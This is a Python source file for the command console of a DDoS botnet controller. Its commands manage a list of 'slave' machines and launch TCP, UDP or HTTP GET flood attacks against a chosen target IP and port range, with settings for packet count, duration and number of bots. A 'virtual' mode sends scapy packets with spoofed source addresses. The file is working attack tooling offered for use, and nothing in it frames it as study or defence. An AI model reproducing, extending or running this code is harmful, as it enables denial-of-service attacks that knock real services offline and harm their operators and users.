from utils.socks import Master , Log
import socket

from utils import ipGen , parse_args , CommandError

from scapy.all import *

slaves = ["192.168.175."+str(i) for i in range(1,255)]

print("Slave List Created")

master = Master(slaves=slaves)

def showHelp() :
    print("""
        ping            -   To check available machines
        kill            -   To Stop all slaves
        exit            -   To exit master
        help            -   To display this help
        up              -   Display List of Up Slaves
        add-slave       -   To Add Slave
            usage : add-slave -h\--host target_ip
                target_ip   -   Target IP Address to Addd
        remove-slave    -   To Remove Slave
            usage : remove-slave -h\--host target_ip
                target_ip   -   Target IP Address to Remove
        attack          -   To Start Attack
            usage : attack -h\--host target_ip -p\--port target_port -m\--mode mode -c\--count count -d\--duration duration -s\--slaves slaves -t\--type type
                target_ip   -   Target IP to Attack
                target_port -   Targe Port or Port Range [eg.1000 or 1000-2000]
                                Default : 'all'
                mode        -   Mode of attack  ['botnet'|'virtual']
                                Default : 'botnet'
                count       -   Number of packets to send 
                                Default : 100
                duration    -   Time To Keep Attack Live (in seconds)
                                Default : 30    
                slaves      -   Number of Slaves to Use
                                Default : 'all'
                type        -   Type of Attack 
                                Default = 0
                                    0   -   TCP
                                    1   -   UDP
                                    2   -   HTTP GET
    """)

prevCmd = []

running = True

try :
    while running :
        cmd = input(">>> ").split()
        try :
            cmd = parse_args(cmd)

            if cmd.command == 'redo' :
                cmd = prevCmd
            print(cmd)
            
            if cmd.command == None :
                showHelp()
            
            elif cmd.command == "ping" :
                master.ping()
            
            elif cmd.command == "help" :
                showHelp()
            
            elif cmd.command == "kill" :
                print(Log("Killing Slaves"))
                master.killSlaves()
            
            elif cmd.command == "up" :
                print(master.up)

            elif cmd.command == 'add-slave' :
                slave = cmd.target
                if slave == None :
                    raise CommandError('Specify Target')
                master.addSlave(slave)
                print(Log(f"{slave} added"))
            
            elif cmd.command == 'remove-slave' :
                slave = cmd.target
                if slave == None :
                    raise CommandError('Specify Target')
                master.removeSlave(slave)
            
            elif cmd.command == 'attack' :
                target = cmd.target
                if target == None :
                    raise CommandError('Specify Target')

                mode = cmd.mode
                count = cmd.count
                duration = cmd.duration
                if cmd.slaves == None or cmd.slaves == 'all' :
                    slaves = 255
                else :
                    slaves = int(cmd.slaves)

                ports = cmd.ports
                aType = cmd.aType

                if mode == 'botnet' :
                    master.attack(target,ports,count,duration,aType,slaves)
                else :
                    "Do Virtual Send"
                    IP1 = IP(src=ipGen(),dst=target)
                    TCP1 = TCP(sport = random.randint(1,65535), dport = 80)
                    pkt = IP1 / TCP1
                    send(pkt,inter = .001)
            
            elif cmd.command == "exit" :
                print(Log("Stopping Master"))
                running = False
                # exit(0)
            
            else :
                print("Unrecognized Command")
                print("Try")
                showHelp()
                continue
        except BaseException as e :
            print(Log(e))
            print(Log(type(e)))
            showHelp()
            continue
        prevCmd = cmd
except KeyboardInterrupt :
    print(Log("Keyboard Interrupt Received"))
    print(Log("Exiting Master"))